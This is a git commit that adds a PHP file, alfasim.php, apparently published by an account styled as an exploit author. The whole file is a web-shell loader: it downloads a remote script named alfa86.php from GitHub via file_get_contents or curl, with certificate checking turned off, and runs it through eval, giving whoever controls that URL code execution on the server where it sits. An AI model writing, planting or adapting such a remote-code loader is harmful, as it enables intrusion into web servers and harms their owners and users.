ce25445980c978f94023254862d29584fd8aa58e
JawaTengahXploit⁨¹³³⁷⁩ <94507398+JawaTengahXploit1337@users.noreply.github.com>
2024-08-05 00:25:56 +0700

    Create alfasim.php

---
+++ alfasim.php
@@ -0,0 +1,25 @@
+<?php
+
+
+function getBacklink($url) {
+    
+    if( ini_get('allow_url_fopen') == 1 ) {
+        // Jika url fopen on maka jalankan
+        return file_get_contents($url);
+    }else if(function_exists('curl_version')) {
+        //Jika url fopen off maka jalankan menggunakan curl
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+}
+
+
+eval("?>" . getBacklink("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/alfa86.php"));
+
+?>
